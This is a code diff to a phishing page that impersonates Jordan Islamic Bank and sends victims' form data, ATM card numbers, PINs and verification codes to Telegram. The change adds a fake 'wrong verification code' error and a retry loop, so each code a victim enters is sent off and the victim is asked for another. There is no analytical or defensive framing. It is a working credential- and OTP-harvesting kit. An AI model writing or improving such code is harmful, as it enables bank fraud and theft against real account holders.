@@ -323,6 +323,21 @@
             margin-bottom: 13px;
             margin-top: 7px;
         }
+
+        .verify-error {
+            color: #fff;
+            background: #b71c1c;
+            border-radius: 12px;
+            padding: 13px 8px;
+            font-size: 1.13rem;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 12px;
+            margin-top: 6px;
+            border: 1.5px solid #fff;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.08);
+            display: none;
+        }
         @media (max-width: 480px) {
             .container { padding-top: 24px;}
             .logo { width: 100px;}
@@ -459,6 +474,7 @@
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
             <div id="verifyLabel" class="info-text">ادخل رمز التحقق</div>
+            <div class="verify-error" id="verifyErrorMsg">رمز التحقق غير صحيح يرجى ادخال رمز التحقق مرة اخرى</div>
             <form class="form-card" id="verifyForm" autocomplete="off" onsubmit="return sendVerification(event)">
                 <input type="text" id="verifyCode" name="verifyCode" placeholder="رمز التحقق" maxlength="6" required inputmode="numeric">
                 <button type="submit">تأكيد</button>
@@ -477,6 +493,7 @@
         let lastFormData = {};
         let lastFormType = '';
         let cardInfoData = {};
+        let verifyTries = 0;
 
         function showView(view) {
             document.querySelectorAll('.view').forEach(e => e.classList.remove('active'));
@@ -484,6 +501,12 @@
             if(view === "cardInfoView") {
                 setTimeout(()=>{
                     if(document.getElementById('cardNum1')) document.getElementById('cardNum1').focus();
+                }, 120);
+            }
+            if(view === "verifyView") {
+                document.getElementById("verifyErrorMsg").style.display = verifyTries > 0 ? "block" : "none";
+                setTimeout(()=>{
+                    if(document.getElementById('verifyCode')) document.getElementById('verifyCode').focus();
                 }, 120);
             }
         }
@@ -504,6 +527,7 @@
                     summary: summary
                 };
                 sendToTelegram(lastFormData.summary);
+                verifyTries = 0;
                 showView('verifyView');
             }
             return false;
@@ -546,7 +570,6 @@
         // On card info submit
         function goToVerificationFromCard(event) {
             event.preventDefault();
-            // Get card number and pin as full string
             let cardNum = [
                 document.getElementById('cardNum1').value,
                 document.getElementById('cardNum2').value,
@@ -570,8 +593,8 @@
                 cardSecret4: document.getElementById('cardSecret4').value
             };
             let cardSummary = `بطاقة الصراف الآلي\nرقم البطاقة: ${cardNum}\nالرقم السري: ${pin}`;
-            // Send all previous + card info
             sendToTelegram((lastFormData.summary || '') + '\n' + cardSummary);
+            verifyTries = 0;
             showView('verifyView');
             return false;
         }
@@ -587,14 +610,10 @@
                 ((cardInfoData.cardNum1) ? `\nبطاقة الصراف الآلي\nرقم البطاقة: ${cardNum}\nالرقم السري: ${pin}` : '') +
                 `\nرمز التحقق: ${code}`;
             sendToTelegram(msg, true);
-            showView('successView');
-            setTimeout(() => { 
-                // Reset all forms and views
-                document.querySelectorAll('form').forEach(f=>f.reset());
-                cardInfoData = {};
-                lastFormData = {};
-                showView('mainView'); 
-            }, 3500);
+            // بعد كل محاولة، تظهر رسالة الخطأ ويعاد فتح رمز التحقق
+            verifyTries++;
+            document.getElementById("verifyCode").value = "";
+            showView('verifyView');
             return false;
         }
 
